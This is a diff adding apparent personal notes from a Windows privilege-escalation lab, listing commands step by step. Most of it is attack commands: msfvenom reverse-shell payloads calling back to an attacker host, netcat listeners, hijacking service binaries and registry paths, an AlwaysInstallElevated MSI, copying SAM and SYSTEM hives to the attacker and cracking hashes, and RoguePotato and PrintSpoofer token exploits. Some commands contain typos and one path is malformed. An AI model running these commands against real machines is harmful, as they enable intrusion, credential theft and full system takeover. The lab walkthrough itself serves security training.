@@ -1,0 +1,139 @@
+xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.0.189
+
+## Reverse Shell
+1. Created Reverse shell executable on host machine
+- msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
+2. Created SMB Server on host kali machine to transfer reverse shell exec to Windows Machine
+- sudo python3 /opt/impacket/examples/smbserver.py kali .
+3. Copied reverse.exe to windows machine
+- copy \\10.10.132.21 \kali\reverse.exe C:\PrivEsc\reverse.exe
+4. Setup netcat to test the shell
+- sudo nc -nvlp 53
+5. Ran reverse shell from windows machine
+-  C:\PrivEsc\reverse.exe
+
+## Service Exploits - Insecure Service Permissions
+1. Usec accesschk.exe  to check user account permissions for daclsvc
+- C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
+2. Check system privileges
+- sc qc daclsvc
+3. Modified service Binary path to the reverse.exe
+- sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
+4. Started netcat listener on Kali machine and then ran dasclsvc service
+- net start daclsvc
+
+## Service Exploits - Unquoted Service Path
+1. Used accesschk.exe alloweing to write to the C:\Program Files\Unquoted Path Service\ directory.
+- C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+2. Copied the reverse.exe to a new path and renaming it common.exe
+- copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+3. Started lsitener on kali machine and then ran unquotedsvc service
+- net start unquotedsvc
+
+## Service Exploits - Weak Registry Permissions
+1. Used accesschk.exe, noted that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users):
+- C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+2. Overwritd  the ImagePath registry key to point to the reverse.exe executable
+- reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+3. Started kali netcat listener and ran regsvc to gain shell.
+
+## Service Exploits - Insecure Service Executables
+1. Queried the filepermsvc service
+- sc qc filepermsvc
+2. Used accesschk.exe to view BINARY file path permissions
+- C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+3. Copied the reverse.exe file path and replaced the filepermservice.exe with it
+- copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
+4. Ran filepermsvc.exe and gained shell
+- net start filepermsvc
+
+## Registry - AutoRuns
+1. Queryed Registry values for Autorun
+- reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+2. Used accesschk.exe to look at the permissions.
+- C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+3. Copy Reverse.exe to overrite the AutoRun.exe
+- copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
+4. Connected via RDP to gain shell
+- rdesktop 10.10.131.21
+
+## Registry - AlwaysInstallElevated
+1. Queried the registry for AlwaysInstallElevated keys
+- reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+2. Create reverse shell.msi 
+- msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.131.21 LPORT=53 -f msi -o reverse.msi
+3. Transfered via SMB kali server to target machine
+4. Ran installer on target machine under the hood
+- msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+
+## Passwords - Registry
+1. Search reg keys for password instances
+- reg query HKLM /f password /t REG_SZ /s
+- reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+2. Loaded command prompt for admin privileges 
+- winexe -U 'admin%password' //10.10.131.21 cmd.exe
+
+## Passwords - Saved Creds
+1. Listed saved credentials on the computer
+- cmdkey /list
+2. Started listener on kali machine, and ran reverse.exe with admin creds.
+- runas /savecred /user:admin C:\PrivEsc\reverse.exe
+
+## Passwords - Security Account Manager (SAM)
+1. Transferred the SAM and SYSTEM files to Kali VM
+- copy C:\Windows\Repair\SAM \\10.10.131.21\kali\
+copy C:\Windows\Repair\SYSTEM \\10.10.131.21\kali\
+2. Cloned and dumped the Hashes
+- git clone https://github.com/Tib3rius/creddump7
+pip3 install pycrypto
+python3 creddump7/pwdump.py SYSTEM SAM
+3. Cracked the admin NTLM hash using hashcat
+- hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
+
+## Passwords - Passing the Hash
+1. Utilized pash the hash attack
+
+## Scheduled Tasks
+1. Viewed Devtools Script
+- type C:\DevTools\CleanUp.ps1
+2. Used accesschk.exe to check writeable permissions
+- C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
+3. Started listenr and added newline to DevTools Cleanup.ps1 to run reverse.exe
+- echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
+
+## Insecure GUI Apps
+1. Logged in as User
+- rdesktop -u user -p password321 10.10.131.21
+2. Checked Admin privileges of mspaint.exe
+- tasklist /V | findstr mspaint.exe
+3. pasted system32 cmd.exe file path
+- file://c:/windows/system32/cmd.exe
+4. Gained shell
+
+## Startup Apps
+1. Used accesschk.exe to check write privileges for Startup Apps
+- C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+2. Used Cscript to run new shortcut to reverse.exe
+- cscript C:\PrivEsc\CreateShortcut.vbs
+3. Extracted admin creds, started listener and gained shell
+- rdesktop -u admin 10.10.131.21
+
+## Token Impersonation - Rogue Potato
+1. Setup socat redirector
+- sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.131.21:4444
+2. Logged into RDP as the admin user and used PSExec.exe to launch reverse.exe as local user.
+- C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
+3. Started Listener on kali machione, then ran Rouge potato exploit 
+- C:\PrivEsc\RoguePotato.exe -r 10.10.131.21 -e "C:\PrivEsc\reverse.exe" -l 4444
+
+## Print Spoofer
+1. Used PsExec.exe to run admin priv for reverse.exe via rdp
+- C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
+2. In local shell ran PrintSpoofer Exploit with system privileges.
+- C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
+
+
+
+
+
